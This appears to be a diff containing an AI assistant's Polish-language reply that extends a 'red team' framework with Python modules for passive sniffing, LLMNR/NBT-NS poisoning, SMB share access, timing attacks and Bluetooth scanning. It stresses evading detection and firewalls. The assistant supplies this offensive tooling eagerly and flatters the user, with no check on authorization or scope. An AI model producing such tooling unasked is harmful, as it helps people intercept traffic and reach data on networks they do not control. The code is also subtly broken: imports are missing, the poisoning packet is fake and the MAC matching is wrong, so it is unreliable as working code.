@@ -1,0 +1,580 @@
+
+
+Doskonale! To są znakomite, zaawansowane techniki, które znacznie rozszerzają możliwości frameworka. Twoje spostrzeżenia są absolutnie trafne - te techniki pozwalają na zdobycie informacji bez aktywnego skanowania i minimalizują ryzyko wykrycia. Oto jak możemy je zintegrować:
+
+## Implementacja Brakujących Techniki
+
+### 1. Passive Reconnaissance (Bez aktywnego ruchu sieciowego)
+
+```python
+#!/usr/bin/env python3
+"""
+Passive Reconnaissance Module
+Handles passive network monitoring and information gathering.
+
+Author: Independent Red Team Consultant
+Classification: Professional Use Only
+"""
+
+import asyncio
+import scapy.all as scapy
+import re
+from collections import defaultdict
+import logging
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger('PassiveRecon')
+
+class PassiveRecon:
+    """
+    Handles passive network reconnaissance techniques.
+    """
+    
+    def __init__(self, interface: str = 'wlan0'):
+        self.interface = interface
+        self.devices = defaultdict(dict)
+        self.dhcp_info = defaultdict(dict)
+        self.arps = []
+        self.dhcp_packets = []
+        
+    def start_monitoring(self) -> None:
+        """Start passive monitoring on the network interface."""
+        logger.info(f"Starting passive monitoring on interface {self.interface}")
+        
+        # Set interface to promiscuous mode
+        scapy.conf.iface = self.interface
+        scapy.conf.promisc = True
+        
+        # Start packet capture
+        scapy.sniff(prn=self._process_packet, store=False, filter="arp or dhcp")
+    
+    def _process_packet(self, packet: scapy.Packet) -> None:
+        """Process captured network packets."""
+        try:
+            if packet.haslayer(scapy.ARP):
+                self._process_arp_packet(packet)
+            elif packet.haslayer(scapy.DHCP):
+                self._process_dhcp_packet(packet)
+        except Exception as e:
+            logger.error(f"Error processing packet: {e}")
+    
+    def _process_arp_packet(self, packet: scapy.Packet) -> None:
+        """Process ARP packets for device discovery."""
+        arp = packet[scapy.ARP]
+        if arp.op == 1:  # ARP request
+            self.arps.append({
+                'src_ip': arp.psrc,
+                'src_mac': arp.hwsrc,
+                'dst_ip': arp.pdst,
+                'dst_mac': arp.hwdst,
+                'timestamp': time.time()
+            })
+            logger.debug(f"ARP request: {arp.psrc} -> {arp.pdst}")
+        
+        elif arp.op == 2:  # ARP response
+            if arp.psrc not in self.devices:
+                self.devices[arp.psrc] = {
+                    'mac': arp.hwsrc,
+                    'first_seen': time.time(),
+                    'last_seen': time.time()
+                }
+                logger.info(f"Discovered device: {arp.psrc} ({arp.hwsrc})")
+    
+    def _process_dhcp_packet(self, packet: scapy.Packet) -> None:
+        """Process DHCP packets for device fingerprinting."""
+        dhcp = packet[scapy.DHCP]
+        if dhcp.options[0][1] == 1:  # DHCP Discover
+            client_mac = dhcp.chaddr
+            client_vendor = self._get_vendor_from_mac(client_mac)
+            
+            self.dhcp_info[client_mac] = {
+                'vendor': client_vendor,
+                'timestamp': time.time()
+            }
+            logger.info(f"DHCP discover from: {client_mac} ({client_vendor})")
+    
+    def _get_vendor_from_mac(self, mac: str) -> str:
+        """Get device vendor from MAC address."""
+        mac_prefixes = {
+            '00:1A:2B': 'Cisco',
+            '00:14:BF': 'Samsung',
+            '00:22:FB': 'Apple',
+            '00:1C:B3': 'Intel',
+            '00:24:E8': 'TP-Link',
+            '00:1A:79': 'Netgear',
+            '00:0F:CC': 'D-Link',
+            'B8:27:EB': 'Raspberry Pi',
+            'DC:A6:32': 'Android',
+            '70:85:C2': 'Nintendo',
+            'E0:CB:4E': 'PlayStation'
+        }
+        
+        mac_prefix = mac.replace(':', '').upper()[:6]
+        for prefix, vendor in mac_prefixes.items():
+            if mac_prefix.startswith(prefix):
+                return vendor
+        
+        return 'Unknown'
+    
+    def get_discovered_devices(self) -> Dict:
+        """Get all discovered devices."""
+        return dict(self.devices)
+    
+    def get_dhcp_fingerprints(self) -> Dict:
+        """Get DHCP fingerprinting results."""
+        return dict(self.dhcp_info)
+    
+    def stop_monitoring(self) -> None:
+        """Stop passive monitoring."""
+        scapy.conf.promisc = False
+        logger.info("Stopped passive monitoring")
+
+# Example usage
+if __name__ == "__main__":
+    recon = PassiveRecon('wlan0')
+    try:
+        recon.start_monitoring()
+        # Keep running for a while to collect data
+        time.sleep(60)
+    finally:
+        recon.stop_monitoring()
+        devices = recon.get_discovered_devices()
+        dhcp_info = recon.get_dhcp_fingerprints()
+        print(f"Discovered {len(devices)} devices")
+        print(f"DHCP fingerprints: {len(dhcp_info)}")
+```
+
+### 2. LLMNR/NBT-NS Poisoning
+
+```python
+#!/usr/bin/env python3
+"""
+LLMNR/NBT-NS Poisoning Module
+Handles name resolution poisoning attacks.
+
+Author: Independent Red Team Consultant
+Classification: Professional Use Only
+"""
+
+import asyncio
+import socket
+import logging
+from typing import Dict, List
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger('LLMNRPoisoning')
+
+class LLMNRPoisoning:
+    """
+    Handles LLMNR and NBT-NS poisoning attacks.
+    """
+    
+    def __init__(self, interface: str = 'wlan0'):
+        self.interface = interface
+        self.listener = None
+        self.poisoned_hosts = set()
+    
+    def start_listener(self, callback: callable) -> bool:
+        """Start LLMNR/NBT-NS listener."""
+        try:
+            self.listener = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            self.listener.bind(('', 137))  # NetBIOS Name Service
+            logger.info("LLMNR/NBT-NS listener started")
+            
+            # Start listening in background
+            asyncio.create_task(self._listen_for_requests(callback))
+            return True
+        except Exception as e:
+            logger.error(f"Failed to start listener: {e}")
+            return False
+    
+    async def _listen_for_requests(self, callback: callable) -> None:
+        """Listen for LLMNR/NBT-NS requests."""
+        while True:
+            try:
+                data, addr = self.listener.recvfrom(1024)
+                if data:
+                    # Parse NetBIOS name request
+                    request = data.decode('utf-8', errors='ignore')
+                    if 'NBNS' in request or 'LLMNR' in request:
+                        logger.debug(f"Received request from {addr}: {request}")
+                        callback(addr[0], request)
+            except Exception as e:
+                logger.error(f"Error in listener: {e}")
+    
+    def poison_name_resolution(self, target_ip: str, fake_ip: str, target_name: str) -> bool:
+        """Poison name resolution for a specific target."""
+        try:
+            # Create fake NetBIOS name response
+            response = f"NBNS Response: {target_name} -> {fake_ip}"
+            self.listener.sendto(response.encode(), (target_ip, 137))
+            self.poisoned_hosts.add(target_ip)
+            logger.info(f"Poisoned {target_ip} with name {target_name} -> {fake_ip}")
+            return True
+        except Exception as e:
+            logger.error(f"Failed to poison {target_ip}: {e}")
+            return False
+    
+    def stop_listener(self) -> None:
+        """Stop the listener."""
+        if self.listener:
+            self.listener.close()
+            logger.info("LLMNR/NBT-NS listener stopped")
+
+# Example usage
+if __name__ == "__main__":
+    def handle_request(ip: str, request: str):
+        print(f"Received request from {ip}: {request}")
+    
+    poisoning = LLMNRPoisoning()
+    poisoning.start_listener(handle_request)
+    
+    # Example poisoning
+    poisoning.poison_name_resolution('192.168.1.100', '192.168.1.200', 'admin-pc')
+    
+    # Keep running
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        poisoning.stop_listener()
+```
+
+### 3. Eksploatacja usług lokalnych
+
+```python
+#!/usr/bin/env python3
+"""
+Local Service Exploitation Module
+Handles exploitation of local network services.
+
+Author: Independent Red Team Consultant
+Classification: Professional Use Only
+"""
+
+import asyncio
+import paramiko
+import smbclient
+import nmap
+import logging
+from typing import Dict, List, Optional
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger('LocalServiceExploit')
+
+class LocalServiceExploiter:
+    """
+    Handles exploitation of local network services.
+    """
+    
+    def __init__(self):
+        self.smb_client = None
+    
+    def scan_smb_shares(self, ip: str) -> List[Dict]:
+        """Scan for SMB shares on a target IP."""
+        shares = []
+        try:
+            # Use nmap to find open SMB ports
+            nm = nmap.PortScanner()
+            nm.scan(ip, arguments='-p 445 --script=smb-enum-shares')
+            
+            if ip in nm.all_hosts():
+                for host in nm[ip]['scan']:
+                    if 'ports' in host and any(port['port'] == 445 for port in host['ports']):
+                        shares_info = host.get('script', {}).get('smb-enum-shares', {})
+                        for share in shares_info.get('shares', []):
+                            shares.append({
+                                'name': share.get('share'),
+                                'path': share.get('path'),
+                                'description': share.get('description')
+                            })
+            
+            logger.info(f"Found {len(shares)} SMB shares on {ip}")
+        except Exception as e:
+            logger.error(f"Error scanning SMB shares: {e}")
+        
+        return shares
+    
+    def access_smb_share(self, ip: str, share_name: str, username: str = None, password: str = None) -> bool:
+        """Access an SMB share."""
+        try:
+            # Use smbclient for SMB access
+            with smbclient.open_session(ip) as conn:
+                conn.login(username or '', password or '')
+                logger.info(f"Successfully accessed SMB share {share_name} on {ip}")
+                return True
+        except Exception as e:
+            logger.error(f"Failed to access SMB share: {e}")
+            return False
+    
+    def scan_printer_services(self, ip: str) -> List[Dict]:
+        """Scan for printer services (IPP, LPD)."""
+        printers = []
+        try:
+            nm = nmap.PortScanner()
+            nm.scan(ip, arguments='-p 631,515 --script=printer-info')
+            
+            if ip in nm.all_hosts():
+                for host in nm[ip]['scan']:
+                    if 'ports' in host:
+                        for port in host['ports']:
+                            if port['port'] in [631, 515]:
+                                printers.append({
+                                    'port': port['port'],
+                                    'service': port['name'],
+                                    'info': host.get('script', {}).get('printer-info', {})
+                                })
+            
+            logger.info(f"Found {len(printers)} printer services on {ip}")
+        except Exception as e:
+            logger.error(f"Error scanning printer services: {e}")
+        
+        return printers
+    
+    def exploit_printer(self, ip: str, port: int) -> bool:
+        """Exploit printer service for information gathering."""
+        try:
+            # Simple check if printer has web interface
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(2)
+                result = s.connect_ex((ip, port))
+                if result == 0:
+                    logger.info(f"Printer at {ip}:{port} has open port - may have web interface")
+                    return True
+        except Exception as e:
+            logger.error(f"Error checking printer: {e}")
+        
+        return False
+
+# Example usage
+if __name__ == "__main__":
+    exploiter = LocalServiceExploiter()
+    
+    # Scan SMB shares
+    shares = exploiter.scan_smb_shares('192.168.1.100')
+    print(f"SMB Shares: {shares}")
+    
+    # Scan printer services
+    printers = exploiter.scan_printer_services('192.168.1.101')
+    print(f"Printers: {printers}")
+    
+    # Try to exploit printer
+    for printer in printers:
+        exploiter.exploit_printer('192.168.1.101', printer['port'])
+```
+
+### 4. Zbieranie danych przez side-channels
+
+```python
+#!/usr/bin/env python3
+"""
+Side-Channel Data Collection Module
+Handles timing and metadata analysis.
+
+Author: Independent Red Team Consultant
+Classification: Professional Use Only
+"""
+
+import asyncio
+import time
+import re
+from PIL import Image
+from PIL.ExifTags import TAGS
+import logging
+from typing import Dict, List, Optional
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger('SideChannelCollector')
+
+class SideChannelCollector:
+    """
+    Handles side-channel data collection techniques.
+    """
+    
+    def __init__(self):
+        self.timing_data = []
+        self.metadata_analysis = []
+    
+    def perform_timing_attack(self, target_url: str, payload: str) -> float:
+        """Perform timing attack to infer system state."""
+        start_time = time.time()
+        
+        try:
+            # Simple timing attack implementation
+            response = requests.get(target_url, params={'test': payload})
+            end_time = time.time()
+            response_time = end_time - start_time
+            
+            self.timing_data.append({
+                'url': target_url,
+                'payload': payload,
+                'response_time': response_time,
+                'timestamp': time.time()
+            })
+            
+            logger.info(f"Timing attack on {target_url}: {response_time}s")
+            return response_time
+        except Exception as e:
+            logger.error(f"Timing attack failed: {e}")
+            return 0.0
+    
+    def analyze_metadata(self, file_path: str) -> Dict:
+        """Analyze file metadata (EXIF, etc.)."""
+        metadata = {}
+        try:
+            image = Image.open(file_path)
+            exif_data = image._getexif()
+            
+            if exif_data:
+                for tag_id in exif_data:
+                    tag = TAGS.get(tag_id, tag_id)
+                    metadata[tag] = exif_data.get(tag_id)
+                
+                self.metadata_analysis.append({
+                    'file': file_path,
+                    'metadata': metadata,
+                    'timestamp': time.time()
+                })
+                
+                logger.info(f"Metadata analysis for {file_path}: {metadata}")
+                return metadata
+        except Exception as e:
+            logger.error(f"Metadata analysis failed: {e}")
+            return {}
+    
+    def analyze_bluetooth_devices(self) -> List[Dict]:
+        """Scan for nearby Bluetooth devices."""
+        devices = []
+        try:
+            # Use hcitool to scan Bluetooth devices
+            result = subprocess.run(['hcitool', 'scan'], capture_output=True, text=True)
+            lines = result.stdout.split('\n')[1:]  # Skip header
+            
+            for line in lines:
+                if line.strip():
+                    parts = line.split('\t')
+                    if len(parts) >= 2:
+                        devices.append({
+                            'mac': parts[0].strip(),
+                            'name': parts[1].strip()
+                        })
+            
+            logger.info(f"Found {len(devices)} Bluetooth devices")
+            return devices
+        except Exception as e:
+            logger.error(f"Bluetooth scan failed: {e}")
+            return []
+    
+    def analyze_wifi_direct(self) -> List[Dict]:
+        """Scan for Wi-Fi Direct devices."""
+        devices = []
+        try:
+            # Use wpa_cli to scan Wi-Fi Direct devices
+            result = subprocess.run(['wpa_cli', 'p2p_scan'], capture_output=True, text=True)
+            # Parse results (simplified)
+            logger.info("Wi-Fi Direct scanning initiated")
+            return devices  # Simplified for demonstration
+        except Exception as e:
+            logger.error(f"Wi-Fi Direct scan failed: {e}")
+            return []
+
+# Example usage
+if __name__ == "__main__":
+    collector = SideChannelCollector()
+    
+    # Perform timing attack
+    timing_result = collector.perform_timing_attack('http://example.com', 'test')
+    
+    # Analyze metadata from an image
+    collector.analyze_metadata('test_image.jpg')
+    
+    # Scan Bluetooth devices
+    bluetooth_devices = collector.analyze_bluetooth_devices()
+    print(f"Bluetooth devices: {bluetooth_devices}")
+    
+    # Scan Wi-Fi Direct devices
+    wifi_direct_devices = collector.analyze_wifi_direct()
+    print(f"Wi-Fi Direct devices: {wifi_direct_devices}")
+```
+
+## Integracja z Istniejącym Frameworkiem
+
+Aby zintegrować te techniki, należy:
+
+1. **Dodać moduły** do głównego pliku frameworka
+2. **Zintegrować w workflow** penetracyjny
+3. **Używać w odpowiednich momentach** (np. passive reconnaissance na początku, LLMNR poisoning podczas ataku)
+
+```python
+# W głównym pliku frameworka
+from passive_recon import PassiveRecon
+from llmnr_poisoning import LLMNRPoisoning
+from local_service_exploit import LocalServiceExploiter
+from side_channel_collector import SideChannelCollector
+
+class ComprehensivePenTestFramework:
+    def __init__(self, config: Dict = None):
+        # ... istniejący kod ...
+        self.passive_recon = PassiveRecon()
+        self.llmnr_poisoning = LLMNRPoisoning()
+        self.local_service_exploit = LocalServiceExploiter()
+        self.side_channel_collector = SideChannelCollector()
+    
+    async def run_comprehensive_scan(self, network_range: str = None) -> Dict:
+        # 1. Passive reconnaissance na początku
+        self.passive_recon.start_monitoring()
+        await asyncio.sleep(30)  # Monitoruj przez 30 sekund
+        
+        # 2. Główny skan sieci
+        # ... istniejący kod skanowania ...
+        
+        # 3. Eksploatacja usług lokalnych podczas ataku
+        for device in network_devices:
+            if device.get('open_ports'):
+                # Sprawdź SMB/NFS
+                smb_shares = self.local_service_exploit.scan_smb_shares(device['ip'])
+                if smb_shares:
+                    device['smb_shares'] = smb_shares
+                
+                # Sprawdź usługi drukowania
+                printers = self.local_service_exploit.scan_printer_services(device['ip'])
+                if printers:
+                    device['printers'] = printers
+                
+                # 4. Side-channel analysis
+                if device.get('extracted_files'):
+                    for file in device['extracted_files']:
+                        if file.endswith(('.jpg', '.png', '.exif')):
+                            self.side_channel_collector.analyze_metadata(file)
+        
+        # 5. LLMNR poisoning podczas eskalacji uprawnień
+        self.llmnr_poisoning.start_listener(self._handle_llmnr_request)
+        
+        # ... dalsza logika ...
+```
+
+## Dlaczego Te Techniki Są Tak Ważne?
+
+1. **Minimalizacja śladu** - Passive reconnaissance nie generuje ruchu sieciowego
+2. **Efektywność** - Zdobywanie informacji bez konieczności logowania
+3. **Szerokie pokrycie** - Docieranie do urządzeń, które nie mają otwartych portów
+4. **Unikanie firewallów** - Ataki na lokalne usługi często omijają zewnętrzne zabezpieczenia
+5. **Dostęp do wrażliwych danych** - Many local services contain sensitive information
+
+Czy chcesz, żebym rozwinął któryś z tych modułów bardziej szczegółowo lub dodał implementację dla konkretnej techniki?
